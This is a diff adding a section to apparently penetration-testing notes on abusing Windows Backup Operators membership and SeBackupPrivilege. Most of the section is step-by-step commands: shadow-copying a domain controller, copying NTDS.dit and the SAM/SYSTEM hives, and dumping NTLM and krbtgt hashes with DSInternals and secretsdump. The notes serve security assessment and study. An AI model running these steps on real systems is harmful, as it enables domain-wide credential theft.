@@ -1191,3 +1191,158 @@ c:\inetpub\wwwroot\web.config
 ```
 
 ---
+
+# 🪪 Windows Built-in Groups & SeBackupPrivilege Abuse
+
+
+## 🔹 Overview
+
+Windows systems include several built-in local and domain groups. Many of these grant high-impact privileges that can be abused for privilege escalation or credential extraction.
+
+Important groups to review during assessments include:
+
+* **Backup Operators**
+* **Event Log Readers**
+* **DnsAdmins**
+* **Hyper-V Administrators**
+* **Print Operators**
+* **Server Operators**
+
+These groups may be used by administrators for least-privilege delegation, but are often misconfigured or contain stale accounts.
+
+
+## 🔹 Backup Operators
+
+Members of this group receive:
+
+* **SeBackupPrivilege**
+* **SeRestorePrivilege**
+
+### Capabilities:
+
+* Traverse any folder (ignores ACLs unless there is an explicit *deny*)
+* Programmatically copy files using the `FILE_FLAG_BACKUP_SEMANTICS` flag
+* Log on locally to Domain Controllers
+* Create backups of critical files such as:
+
+  * **NTDS.dit**
+  * **SYSTEM & SAM hives**
+
+### 🔹 Checking Group Membership
+
+```powershell
+whoami /groups
+```
+
+### 🔹 Verifying & Enabling SeBackupPrivilege
+
+### Check privilege:
+
+```powershell
+whoami /priv
+Get-SeBackupPrivilege
+```
+
+### Enable privilege:
+
+```powershell
+Set-SeBackupPrivilege
+```
+
+### 🔹 Import Required DLL Cmdlets
+
+```powershell
+Import-Module .\SeBackupPrivilegeUtils.dll
+Import-Module .\SeBackupPrivilegeCmdLets.dll
+```
+### 🔹 Copy Protected Files Using SeBackupPrivilege
+
+### Example: Cannot normally read file
+
+```powershell
+cat C:\Confidential\2021 Contract.txt   # Access denied
+```
+
+### Copy bypassing ACL:
+
+```powershell
+Copy-FileSeBackupPrivilege 'C:\Confidential\2021 Contract.txt' .\Contract.txt
+```
+
+## 🔹 Abusing on a Domain Controller
+
+Backup Operators can log in to DCs and extract the Active Directory database.
+
+### NTDS.dit is locked → create a shadow copy
+
+### Using diskshadow:
+
+```
+diskshadow
+set verbose on
+set metadata C:\Windows\Temp\meta.cab
+set context clientaccessible
+set context persistent
+begin backup
+add volume C: alias cdrive
+create
+expose %cdrive% E:
+end backup
+exit
+```
+
+Shadow copy is now available at **E:**
+
+### 🔹 Copy NTDS.dit Using SeBackupPrivilege
+
+```powershell
+Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit
+```
+
+
+### 🔹 Backup SYSTEM & SAM Hives
+
+```cmd
+reg save HKLM\SYSTEM SYSTEM.SAV
+reg save HKLM\SAM SAM.SAV
+```
+
+### 🔹 Extracting Credentials from NTDS.dit
+
+### Using DSInternals (PowerShell):
+
+```powershell
+Import-Module .\DSInternals.psd1
+$key = Get-BootKey -SystemHivePath .\SYSTEM
+Get-ADDBAccount -DistinguishedName 'CN=administrator,CN=users,DC=domain,DC=local' `
+  -DBPath .\ntds.dit -BootKey $key
+```
+
+Outputs NTLM hashes, Kerberos keys, WDigest secrets, etc.
+
+
+### 🔹 Extracting Hashes Using SecretsDump.py
+
+```bash
+secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL
+```
+
+You will obtain:
+
+* NTLM hashes for all users
+* Machine account hashes
+* krbtgt hash
+
+## 🔹 Using Robocopy in Backup Mode
+
+Robocopy can copy protected files using the `/B` (backup mode) flag.
+
+### Copy NTDS.dit:
+
+```cmd
+robocopy /B E:\Windows\NTDS C:\Tools\ntds ntds.dit
+```
+
+No external tools required.
+
+---
